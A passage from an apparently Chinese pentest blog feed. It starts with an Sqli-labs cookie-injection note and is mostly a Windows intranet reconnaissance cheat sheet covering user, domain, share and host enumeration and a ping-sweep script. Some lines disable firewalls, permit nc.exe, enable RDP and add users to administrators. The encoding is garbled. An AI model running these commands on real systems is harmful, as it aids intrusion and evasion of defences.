<h2 id="0x20-Less-20-POST-åŸºäºæŠ¥é”™-cookieæ³¨å…¥"><a href="#0x20-Less-20-POST-åŸºäºæŠ¥é”™-cookieæ³¨å…¥" class="headerlink" title="0x20.Less-20 POST åŸºäºæŠ¥é”™ cookieæ³¨å…¥"></a>0x20.Less-20 POST åŸºäºæŠ¥é”™ cookieæ³¨å…¥</h2><p><code>æ³¨å…¥ç‚¹ä¸ºcookieï¼Œæ–¹æ³•åŒLess-1</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">uname=admin&#x27; order by 3 -- -</span><br><span class="line">uname=admin&#x27; order by 4 -- -</span><br></pre></td></tr></table></figure>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110130119066.png" class>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110130152559.png" class>

<p><strong><em>skip:deciduous_tree:</em></strong></p>
]]></content>
      <categories>
        <category>Sqli-labs</category>
      </categories>
      <tags>
        <tag>Sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>å†…ç½‘æ¸—é€æµ‹è¯•-ä¿¡æ¯æ”¶é›†</title>
    <url>/2021/07/17/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<h2 id="0x01-å·¥ä½œç»„ä¿¡æ¯æ”¶é›†"><a href="#0x01-å·¥ä½œç»„ä¿¡æ¯æ”¶é›†" class="headerlink" title="0x01.å·¥ä½œç»„ä¿¡æ¯æ”¶é›†"></a>0x01.å·¥ä½œç»„ä¿¡æ¯æ”¶é›†</h2><h3 id="01-æ£€æµ‹å½“å‰shellæƒé™"><a href="#01-æ£€æµ‹å½“å‰shellæƒé™" class="headerlink" title="01.æ£€æµ‹å½“å‰shellæƒé™"></a>01.æ£€æµ‹å½“å‰shellæƒé™</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">whoami /user    #æŸ¥çœ‹å½“å‰ç”¨æˆ·çš„SID</span><br><span class="line">whoami /priv    #æŸ¥çœ‹å½“å‰ç”¨æˆ·çš„å®‰å…¨æƒé™</span><br><span class="line">whoami /all</span><br></pre></td></tr></table></figure>

<h3 id="02-æŸ¥çœ‹å½“å‰ç³»ç»Ÿä¿¡æ¯"><a href="#02-æŸ¥çœ‹å½“å‰ç³»ç»Ÿä¿¡æ¯" class="headerlink" title="02.æŸ¥çœ‹å½“å‰ç³»ç»Ÿä¿¡æ¯"></a>02.æŸ¥çœ‹å½“å‰ç³»ç»Ÿä¿¡æ¯</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure>

<h3 id="03-tcp-udp-ç½‘ç»œè¿æ¥çŠ¶æ€"><a href="#03-tcp-udp-ç½‘ç»œè¿æ¥çŠ¶æ€" class="headerlink" title="03.tcp/udp ç½‘ç»œè¿æ¥çŠ¶æ€"></a>03.tcp/udp ç½‘ç»œè¿æ¥çŠ¶æ€</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netstat -nao</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<h3 id="04-ä¸»æœºå"><a href="#04-ä¸»æœºå" class="headerlink" title="04.ä¸»æœºå"></a>04.ä¸»æœºå</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hostname</span><br></pre></td></tr></table></figure>

<h3 id="05-å½“å‰æ“ä½œç³»ç»Ÿç‰ˆæœ¬"><a href="#05-å½“å‰æ“ä½œç³»ç»Ÿç‰ˆæœ¬" class="headerlink" title="05.å½“å‰æ“ä½œç³»ç»Ÿç‰ˆæœ¬"></a>05.å½“å‰æ“ä½œç³»ç»Ÿç‰ˆæœ¬</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ver</span><br><span class="line">systeminfo | findstr /B /C:&quot;OS name&quot; /C:&quot;OS Version&quot;    #è‹±æ–‡ç‰ˆ</span><br><span class="line">systeminfo | findstr /B /C:&quot;OS åç§°&quot; /C:&quot;OS ç‰ˆæœ¬&quot;    #ä¸­æ–‡ç‰ˆ</span><br><span class="line">wmic OS GET Caption,CSDVersion,OSArchitecture,Version    #æ›´è¯¦ç»†</span><br></pre></td></tr></table></figure>

<h3 id="06-æŸ¥çœ‹ç³»ç»Ÿä½“ç³»ç»“æ„"><a href="#06-æŸ¥çœ‹ç³»ç»Ÿä½“ç³»ç»“æ„" class="headerlink" title="06.æŸ¥çœ‹ç³»ç»Ÿä½“ç³»ç»“æ„"></a>06.æŸ¥çœ‹ç³»ç»Ÿä½“ç³»ç»“æ„</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo %PROCESSOR_ARCHITECTURE%</span><br></pre></td></tr></table></figure>

<h3 id="07-æŸ¥æ€è½¯"><a href="#07-æŸ¥æ€è½¯" class="headerlink" title="07.æŸ¥æ€è½¯"></a>07.æŸ¥æ€è½¯</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wmic /node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct GET displayName /Format:List</span><br></pre></td></tr></table></figure>

<h3 id="08-æŸ¥çœ‹å®‰è£…çš„ç¨‹åº"><a href="#08-æŸ¥çœ‹å®‰è£…çš„ç¨‹åº" class="headerlink" title="08.æŸ¥çœ‹å®‰è£…çš„ç¨‹åº"></a>08.æŸ¥çœ‹å®‰è£…çš„ç¨‹åº</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wmic product get  name,version</span><br><span class="line">powershell &quot;Get-WmiObject -class Win32_Product | Select-Object -Property name,version&quot;</span><br></pre></td></tr></table></figure>

<h3 id="09-æŸ¥çœ‹åœ¨çº¿ç”¨æˆ·"><a href="#09-æŸ¥çœ‹åœ¨çº¿ç”¨æˆ·" class="headerlink" title="09.æŸ¥çœ‹åœ¨çº¿ç”¨æˆ·"></a>09.æŸ¥çœ‹åœ¨çº¿ç”¨æˆ·</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">quser</span><br><span class="line">query user || qwinsta</span><br></pre></td></tr></table></figure>

<h3 id="10-æŸ¥çœ‹ç½‘ç»œé…ç½®"><a href="#10-æŸ¥çœ‹ç½‘ç»œé…ç½®" class="headerlink" title="10.æŸ¥çœ‹ç½‘ç»œé…ç½®"></a>10.æŸ¥çœ‹ç½‘ç»œé…ç½®</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure>

<h3 id="11-æŸ¥çœ‹è¿›ç¨‹ä¸ä¿¡æ¯"><a href="#11-æŸ¥çœ‹è¿›ç¨‹ä¸ä¿¡æ¯" class="headerlink" title="11.æŸ¥çœ‹è¿›ç¨‹ä¸ä¿¡æ¯"></a>11.æŸ¥çœ‹è¿›ç¨‹ä¸ä¿¡æ¯</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tasklist /v</span><br><span class="line">wmic process list brief</span><br></pre></td></tr></table></figure>

<h3 id="12-æŸ¥çœ‹å½“å‰ç™»å…¥åŸŸ"><a href="#12-æŸ¥çœ‹å½“å‰ç™»å…¥åŸŸ" class="headerlink" title="12.æŸ¥çœ‹å½“å‰ç™»å…¥åŸŸ"></a>12.æŸ¥çœ‹å½“å‰ç™»å…¥åŸŸ</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">net config workstation</span><br></pre></td></tr></table></figure>

<h3 id="13-è¿œç¨‹æ¡Œé¢å†å²è¿æ¥è®°å½•"><a href="#13-è¿œç¨‹æ¡Œé¢å†å²è¿æ¥è®°å½•" class="headerlink" title="13.è¿œç¨‹æ¡Œé¢å†å²è¿æ¥è®°å½•"></a>13.è¿œç¨‹æ¡Œé¢å†å²è¿æ¥è®°å½•</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cmdkey /l</span><br></pre></td></tr></table></figure>

<h3 id="14-æŸ¥çœ‹ç”¨æˆ·åˆ—è¡¨"><a href="#14-æŸ¥çœ‹ç”¨æˆ·åˆ—è¡¨" class="headerlink" title="14.æŸ¥çœ‹ç”¨æˆ·åˆ—è¡¨"></a>14.æŸ¥çœ‹ç”¨æˆ·åˆ—è¡¨</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure>

<h3 id="15-æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯"><a href="#15-æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯" class="headerlink" title="15.æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯"></a>15.æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">net user administrator</span><br></pre></td></tr></table></figure>

<h3 id="16-æŸ¥çœ‹æœ¬æœºæœåŠ¡ä¿¡æ¯"><a href="#16-æŸ¥çœ‹æœ¬æœºæœåŠ¡ä¿¡æ¯" class="headerlink" title="16.æŸ¥çœ‹æœ¬æœºæœåŠ¡ä¿¡æ¯"></a>16.æŸ¥çœ‹æœ¬æœºæœåŠ¡ä¿¡æ¯</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wmic service list brief</span><br></pre></td></tr></table></figure>

<h3 id="17-æŸ¥çœ‹å¯åŠ¨ç¨‹åºä¿¡æ¯"><a href="#17-æŸ¥çœ‹å¯åŠ¨ç¨‹åºä¿¡æ¯" class="headerlink" title="17.æŸ¥çœ‹å¯åŠ¨ç¨‹åºä¿¡æ¯"></a>17.æŸ¥çœ‹å¯åŠ¨ç¨‹åºä¿¡æ¯</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wmic startup get command,caption</span><br></pre></td></tr></table></figure>

<h3 id="18-æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡"><a href="#18-æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡" class="headerlink" title="18.æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡"></a>18.æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">schtasks /query /fo LIST /v</span><br></pre></td></tr></table></figure>

<h3 id="19-æŸ¥çœ‹ä¸»æœºå¼€æœºæ—¶é—´"><a href="#19-æŸ¥çœ‹ä¸»æœºå¼€æœºæ—¶é—´" class="headerlink" title="19.æŸ¥çœ‹ä¸»æœºå¼€æœºæ—¶é—´"></a>19.æŸ¥çœ‹ä¸»æœºå¼€æœºæ—¶é—´</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">net statistics workstation</span><br></pre></td></tr></table></figure>

<h3 id="20-è·å–æœ¬åœ°ç®¡ç†å‘˜ä¿¡æ¯-é€šå¸¸åŒ…æ‹¬åŸŸç”¨æˆ·"><a href="#20-è·å–æœ¬åœ°ç®¡ç†å‘˜ä¿¡æ¯-é€šå¸¸åŒ…æ‹¬åŸŸç”¨æˆ·" class="headerlink" title="20.è·å–æœ¬åœ°ç®¡ç†å‘˜ä¿¡æ¯[é€šå¸¸åŒ…æ‹¬åŸŸç”¨æˆ·]"></a>20.è·å–æœ¬åœ°ç®¡ç†å‘˜ä¿¡æ¯[é€šå¸¸åŒ…æ‹¬åŸŸç”¨æˆ·]</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure>

<h3 id="21-æ˜¾ç¤ºè¿æ¥ä¼šè¯"><a href="#21-æ˜¾ç¤ºè¿æ¥ä¼šè¯" class="headerlink" title="21.æ˜¾ç¤ºè¿æ¥ä¼šè¯"></a>21.æ˜¾ç¤ºè¿æ¥ä¼šè¯</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">net session</span><br></pre></td></tr></table></figure>

<h3 id="22-æŸ¥çœ‹å®‰è£…è¿‡çš„è¡¥ä¸"><a href="#22-æŸ¥çœ‹å®‰è£…è¿‡çš„è¡¥ä¸" class="headerlink" title="22.æŸ¥çœ‹å®‰è£…è¿‡çš„è¡¥ä¸"></a>22.æŸ¥çœ‹å®‰è£…è¿‡çš„è¡¥ä¸</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure>

<h3 id="23-æŸ¥çœ‹å…±äº«åˆ—è¡¨"><a href="#23-æŸ¥çœ‹å…±äº«åˆ—è¡¨" class="headerlink" title="23.æŸ¥çœ‹å…±äº«åˆ—è¡¨"></a>23.æŸ¥çœ‹å…±äº«åˆ—è¡¨</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">net sharewmic share get name,path,status</span><br></pre></td></tr></table></figure>

<h3 id="24-æŸ¥çœ‹è·¯ç”±è¡¨ä¸ARPç¼“å­˜è¡¨"><a href="#24-æŸ¥çœ‹è·¯ç”±è¡¨ä¸ARPç¼“å­˜è¡¨" class="headerlink" title="24.æŸ¥çœ‹è·¯ç”±è¡¨ä¸ARPç¼“å­˜è¡¨"></a>24.æŸ¥çœ‹è·¯ç”±è¡¨ä¸ARPç¼“å­˜è¡¨</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">route printarp -a</span><br></pre></td></tr></table></figure>

<h3 id="25-é˜²ç«å¢™ç›¸å…³"><a href="#25-é˜²ç«å¢™ç›¸å…³" class="headerlink" title="25.é˜²ç«å¢™ç›¸å…³"></a>25.é˜²ç«å¢™ç›¸å…³</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netsh firewall set opmode disable    #server 2003ä¹‹å‰ç‰ˆæœ¬å…³é—­é˜²ç«å¢™netsh advfirewall set allprofiles state off #server 2003ä¹‹åç‰ˆæœ¬å…³é—­é˜²ç«å¢™netsh firewall show config    #æŸ¥çœ‹é˜²ç«å¢™é…ç½®netsh firewall add allowedprogram c:\nc.exe &quot;allow nc&quot; enable    #server 2003ä¹‹å‰ç‰ˆæœ¬å…è®¸æŒ‡å®šç¨‹åºè¿æ¥netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;c:\nc.exe&quot;    #server 2003ä¹‹åå…è®¸æŒ‡å®šç¨‹åºè¿›å…¥netsh advfirewall firewall add rule name=&quot;allow nc&quot; dir=out action=allow program=&quot;c:\nc.exe&quot;    #server 2003ä¹‹åå…è®¸æŒ‡å®šç¨‹åºå‡ºå»netsh advfirewall firewall add rule name=&quot;RPC&quot; protocol=TCP dir=in localport=3389 action=allow #æ”¾è¡Œ3389netsh advfirewall set currentprofile logging filename &quot;c:\windows\temp\fw.log&quot;    #è‡ªå®šä¹‰é˜²ç«å¢™æ—¥å¿—æ–‡ä»¶ä½ç½®</span><br></pre></td></tr></table></figure>

<h3 id="26-æŸ¥çœ‹ä»£ç†é…ç½®æƒ…å†µ"><a href="#26-æŸ¥çœ‹ä»£ç†é…ç½®æƒ…å†µ" class="headerlink" title="26.æŸ¥çœ‹ä»£ç†é…ç½®æƒ…å†µ"></a>26.æŸ¥çœ‹ä»£ç†é…ç½®æƒ…å†µ</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</span><br></pre></td></tr></table></figure>

<h3 id="27-æŸ¥è¯¢å¹¶å¼€å¯è¿œç¨‹è¿æ¥æœåŠ¡"><a href="#27-æŸ¥è¯¢å¹¶å¼€å¯è¿œç¨‹è¿æ¥æœåŠ¡" class="headerlink" title="27.æŸ¥è¯¢å¹¶å¼€å¯è¿œç¨‹è¿æ¥æœåŠ¡"></a>27.æŸ¥è¯¢å¹¶å¼€å¯è¿œç¨‹è¿æ¥æœåŠ¡</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /V PortNumber    #æŸ¥çœ‹è¿œç¨‹è¿æ¥ç«¯å£(RDP) 3389ç«¯å£åå…­è¿›åˆ¶ä¸º0xd3d</span><br><span class="line">wmic path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1    #server 2003ç‰ˆæœ¬ä»¥ä¸‹å¼€å¯3389</span><br><span class="line">wmic path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 0    #server 2003ç‰ˆæœ¬ä»¥ä¸‹å…³é—­3389</span><br><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1    #server 2003ç‰ˆæœ¬ä»¥ä¸Šå¼€å¯3389(win7å¯ä»¥)</span><br><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 0    #server 2003ç‰ˆæœ¬ä»¥ä¸Šå…³é—­3389</span><br><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName=&#x27;RDP-Tcp&#x27;) call setuserauthenticationrequired 1    #server 2008/2012ç‰ˆæœ¬å¼€å¯3389(win7ä¸å¯ä»¥)</span><br><span class="line">reg add &quot;HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /f    #server 2008/2012ç‰ˆæœ¬å¼€å¯3389</span><br></pre></td></tr></table></figure>

<h2 id="0x02-åŸŸå†…ä¿¡æ¯æ”¶é›†"><a href="#0x02-åŸŸå†…ä¿¡æ¯æ”¶é›†" class="headerlink" title="0x02.åŸŸå†…ä¿¡æ¯æ”¶é›†"></a>0x02.åŸŸå†…ä¿¡æ¯æ”¶é›†</h2><h3 id="01-æŸ¥çœ‹åŸŸç”¨æˆ·ä¿¡æ¯"><a href="#01-æŸ¥çœ‹åŸŸç”¨æˆ·ä¿¡æ¯" class="headerlink" title="01.æŸ¥çœ‹åŸŸç”¨æˆ·ä¿¡æ¯"></a>01.æŸ¥çœ‹åŸŸç”¨æˆ·ä¿¡æ¯</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">net user /domain    #æ˜¾ç¤ºæ‰€åœ¨åŸŸçš„ç”¨æˆ·åå•</span><br><span class="line">net user åŸŸç”¨æˆ· /domain    #è·å–åŸŸç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯</span><br><span class="line">net user /domain xxx 123456    #ä¿®æ”¹åŸŸç”¨æˆ·å¯†ç ï¼Œéœ€è¦ç®¡ç†å‘˜æƒé™</span><br></pre></td></tr></table></figure>

<h3 id="02-æŸ¥è¯¢åŸŸä¿¡ä»»åˆ—è¡¨"><a href="#02-æŸ¥è¯¢åŸŸä¿¡ä»»åˆ—è¡¨" class="headerlink" title="02.æŸ¥è¯¢åŸŸä¿¡ä»»åˆ—è¡¨"></a>02.æŸ¥è¯¢åŸŸä¿¡ä»»åˆ—è¡¨</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nltest /domain_trusts /all_trusts /v</span><br></pre></td></tr></table></figure>

<h3 id="03-è¿”å›åŸŸæ§ä¸å…¶å¯¹åº”çš„IP"><a href="#03-è¿”å›åŸŸæ§ä¸å…¶å¯¹åº”çš„IP" class="headerlink" title="03.è¿”å›åŸŸæ§ä¸å…¶å¯¹åº”çš„IP"></a>03.è¿”å›åŸŸæ§ä¸å…¶å¯¹åº”çš„IP</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nltest /dsgetdc:jiye</span><br><span class="line">nslookup -type=SRV _ldap._tcp    #æŸ¥çœ‹åŸŸæ§ä¸»æœºå</span><br><span class="line">netdom query pdc    #æŸ¥è¯¢åŸŸæ§</span><br></pre></td></tr></table></figure>

<h3 id="04-åŸŸç”¨æˆ·ç»„ç›¸å…³æŸ¥è¯¢"><a href="#04-åŸŸç”¨æˆ·ç»„ç›¸å…³æŸ¥è¯¢" class="headerlink" title="04.åŸŸç”¨æˆ·ç»„ç›¸å…³æŸ¥è¯¢"></a>04.åŸŸç”¨æˆ·ç»„ç›¸å…³æŸ¥è¯¢</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">net group &quot;domain admins&quot; /domain    #æŸ¥çœ‹åŸŸç®¡ç†å‘˜åˆ—è¡¨net group &quot;domain controllers&quot; /domain    #æŸ¥çœ‹åŸŸæ§åˆ¶å™¨(å¦‚æœæœ‰å¤šå°)net group &quot;domain computers&quot; /domain    #æŸ¥çœ‹åŸŸæœºå™¨net group &quot;domain users&quot; /domain    #æŸ¥çœ‹åŸŸå…¨éƒ¨ç”¨æˆ·net group /domain    #æŸ¥çœ‹åŸŸé‡Œå·¥ä½œç»„net localgroup administrators    #æŸ¥çœ‹æœ¬æœºç®¡ç†å‘˜[é€šå¸¸å«æœ‰åŸŸç”¨æˆ·]net localgroup administrators /domain    #ç™»å…¥æœ¬æœºçš„åŸŸç®¡ç†å‘˜net localgroup administrators workgroup\user /add    #åŸŸç”¨æˆ·æ·»åŠ åˆ°æœ¬æœº</span><br></pre></td></tr></table></figure>

<h2 id="04-è·å–åŸŸå†…ç”¨æˆ·å’Œç®¡ç†å‘˜ä¿¡æ¯-åŸŸæ§"><a href="#04-è·å–åŸŸå†…ç”¨æˆ·å’Œç®¡ç†å‘˜ä¿¡æ¯-åŸŸæ§" class="headerlink" title="04.è·å–åŸŸå†…ç”¨æˆ·å’Œç®¡ç†å‘˜ä¿¡æ¯(åŸŸæ§)"></a>04.è·å–åŸŸå†…ç”¨æˆ·å’Œç®¡ç†å‘˜ä¿¡æ¯(åŸŸæ§)</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wmic useraccount get /all    #è·å–åŸŸå†…ç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯dsquery user        #æŸ¥çœ‹å­˜åœ¨ç”¨æˆ·dsquery computer    #æŸ¥è¯¢ç›®å½•ä¸­çš„è®¡ç®—æœºdsquery contact        #æŸ¥è¯¢ç›®å½•ä¸­çš„è”ç³»äººdsquery subnet        #æŸ¥è¯¢ç›®å½•ä¸­çš„å­ç½‘dsquery group        #æŸ¥è¯¢ç›®å½•ä¸­çš„ç»„dsquery ou            #æŸ¥è¯¢ç›®å½•ä¸­çš„ç»„ç»‡å•ä½dsquery site        #æŸ¥è¯¢ç›®å½•ä¸­çš„ç«™ç‚¹dsquery server        #æŸ¥è¯¢ç›®å½•ä¸­çš„AD DC/LDSå®ä¾‹dsquery user        #æŸ¥è¯¢ç›®å½•ä¸­çš„ç”¨æˆ·dsquery quota        #æŸ¥è¯¢ç›®å½•ä¸­çš„é…é¢è§„å®šdsquery partition    #æŸ¥è¯¢ç›®å½•ä¸­çš„åˆ†åŒºdsquery * -            #ç”¨é€šç”¨çš„LDAPæŸ¥è¯¢ç›®å½•ä¸­çš„ä»»ä½•å¯¹è±¡</span><br></pre></td></tr></table></figure>

<h3 id="05-åŸŸä¸»æœºç›¸å…³æŸ¥è¯¢"><a href="#05-åŸŸä¸»æœºç›¸å…³æŸ¥è¯¢" class="headerlink" title="05.åŸŸä¸»æœºç›¸å…³æŸ¥è¯¢"></a>05.åŸŸä¸»æœºç›¸å…³æŸ¥è¯¢</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">net view    #æŸ¥çœ‹åŒä¸€åŸŸå†…æœºå™¨åˆ—è¡¨net view \\IP    #æŸ¥çœ‹æŸIPå…±äº«net view \\DC    #æŸ¥çœ‹DCè®¡ç®—æœºçš„å…±äº«èµ„æºåˆ—è¡¨net view /domain    #æŸ¥çœ‹å†…ç½‘å­˜åœ¨å¤šå°‘ä¸ªåŸŸnet view /domain:jiye    #æŸ¥çœ‹jiyeåŸŸä¸­çš„æœºå™¨åˆ—è¡¨</span><br></pre></td></tr></table></figure>

<h3 id="06-æŸ¥çœ‹åŸŸç”¨æˆ·å¯†ç è¿‡æœŸç­‰ä¿¡æ¯"><a href="#06-æŸ¥çœ‹åŸŸç”¨æˆ·å¯†ç è¿‡æœŸç­‰ä¿¡æ¯" class="headerlink" title="06.æŸ¥çœ‹åŸŸç”¨æˆ·å¯†ç è¿‡æœŸç­‰ä¿¡æ¯"></a>06.æŸ¥çœ‹åŸŸç”¨æˆ·å¯†ç è¿‡æœŸç­‰ä¿¡æ¯</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">net accounts /domain</span><br></pre></td></tr></table></figure>

<h3 id="07-åˆ¤æ–­åŸŸæ˜¯å¦å­˜åœ¨"><a href="#07-åˆ¤æ–­åŸŸæ˜¯å¦å­˜åœ¨" class="headerlink" title="07.åˆ¤æ–­åŸŸæ˜¯å¦å­˜åœ¨"></a>07.åˆ¤æ–­åŸŸæ˜¯å¦å­˜åœ¨</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ipconfig /allsysteminfonet config workstation    #å½“å‰ç™»å…¥åŸŸ</span><br></pre></td></tr></table></figure>

<h3 id="08-åˆ¤æ–­ä¸»åŸŸ"><a href="#08-åˆ¤æ–­ä¸»åŸŸ" class="headerlink" title="08.åˆ¤æ–­ä¸»åŸŸ"></a>08.åˆ¤æ–­ä¸»åŸŸ</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">net time /domainæ‰§è¡Œä»¥ä¸Šå‘½ä»¤é€šå¸¸æœ‰ä¸‰ç§æƒ…å†µï¼š1.å­˜åœ¨åŸŸï¼Œä½†å½“å‰ç”¨æˆ·ä¸æ˜¯åŸŸç”¨æˆ·ï¼Œä¼šå‡ºç°æ‹’ç»è®¿é—®ç»“æœ2.å­˜åœ¨åŸŸï¼Œä½†å½“å‰ç”¨æˆ·æ˜¯åŸŸç”¨æˆ·ï¼Œå¾—åˆ°æ­£å¸¸è¾“å‡º3.å½“å‰ç¯å¢ƒä¸ºå·¥ä½œç»„ï¼Œä¸å­˜åœ¨åŸŸï¼Œä¼šå‡ºç°æ‰¾ä¸åˆ°åŸŸæ§ä¿¡æ¯</span><br></pre></td></tr></table></figure>

<h3 id="09-åˆ©ç”¨NetBios-ç½‘ç»œé‚»å±…-æ¢æµ‹å†…ç½‘"><a href="#09-åˆ©ç”¨NetBios-ç½‘ç»œé‚»å±…-æ¢æµ‹å†…ç½‘" class="headerlink" title="09.åˆ©ç”¨NetBios(ç½‘ç»œé‚»å±…)æ¢æµ‹å†…ç½‘"></a>09.åˆ©ç”¨NetBios(ç½‘ç»œé‚»å±…)æ¢æµ‹å†…ç½‘</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nbtscan.exeæ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œå¯ä»¥æ‰«æå¼€æ”¾NetBiosåç§°æœåŠ¡å™¨nbtscan-1.0.35.exe 10.10.10.0/2410.10.10.10     JIYE\DC                         SHARING DC10.10.10.20     JIYE\WIN7DC1                    SHARING*timeout (normal end of scan)</span><br></pre></td></tr></table></figure>

<h3 id="10-ICMPåè®®å¿«é€Ÿæ¢æµ‹å†…ç½‘"><a href="#10-ICMPåè®®å¿«é€Ÿæ¢æµ‹å†…ç½‘" class="headerlink" title="10.ICMPåè®®å¿«é€Ÿæ¢æµ‹å†…ç½‘"></a>10.ICMPåè®®å¿«é€Ÿæ¢æµ‹å†…ç½‘</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">for /L %I in (1,1,254) DO @ping -w 1 -n 1 10.10.10.%I | findstr &quot;TTL&quot;</span><br></pre></td></tr></table></figure>

<p><code>vbsè„šæœ¬æ¢æµ‹</code></p>
<figure class="highlight vbscript"><table><tr><td class="code"><pre><span class="line">strSubNet = <span class="string">&quot;10.10.10.&quot;</span> </span><br><span class="line"><span class="keyword">Set</span> objFSO= <span class="built_in">CreateObject</span>(<span class="string">&quot;Scripting.FileSystemObject&quot;</span>) </span><br><span class="line"><span class="keyword">Set</span> objTS = objfso.CreateTextFile(<span class="string">&quot;C:\Windows\Temp\Result.txt&quot;</span>)  </span><br><span class="line"><span class="keyword">For</span> i = <span class="number">1</span> <span class="keyword">To</span> <span class="number">254</span> </span><br><span class="line">strComputer = strSubNet &amp; i </span><br><span class="line">blnResult = Ping(strComputer) </span><br><span class="line"><span class="keyword">If</span> blnResult = <span class="literal">True</span> <span class="keyword">Then</span> </span><br><span class="line">objTS.WriteLine strComputer &amp; <span class="string">&quot; is alive ! :) &quot;</span> </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"> <span class="keyword">Next</span>  </span><br><span class="line"> </span><br><span class="line">objTS.Close </span><br><span class="line">WScript.Echo <span class="string">&quot; All Ping scan, All Done!) &quot;</span>   </span><br><span class="line"><span class="keyword">Function</span> Ping(strComputer) </span><br><span class="line"><span class="keyword">Set</span> objWMIService = <span class="built_in">GetObject</span>(<span class="string">&quot;winmgmts:\\.\root\cimv2&quot;</span>) </span><br><span class="line"><span class="keyword">Set</span> colItems = objWMIService.ExecQuery(<span class="string">&quot;Select * From Win32_PingStatus Where Address=&#x27;&quot;</span> &amp; strComputer &amp; <span class="string">&quot;&#x27;&quot;</span>) </span><br><span class="line"><span class="keyword">For</span> <span class="keyword">Each</span> objItem <span class="keyword">In</span> colItems </span><br><span class="line"><span class="keyword">Select</span> <span class="keyword">case</span> objItem.StatusCode </span><br><span class="line"><span class="keyword">Case</span> <span class="number">0</span> </span><br><span class="line">Ping = <span class="literal">True</span> </span><br><span class="line"><span class="keyword">Case</span> <span class="keyword">Else</span> </span><br><span class="line">Ping = <span class="literal">False</span> </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">select</span> </span><br><span class="line"><span class="keyword">Exit</span> <span class="keyword">For</span> </span><br><span class="line"><span class="keyword">Next</span> </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span> </span><br><span class="line"></span><br><span class="line">#cscript 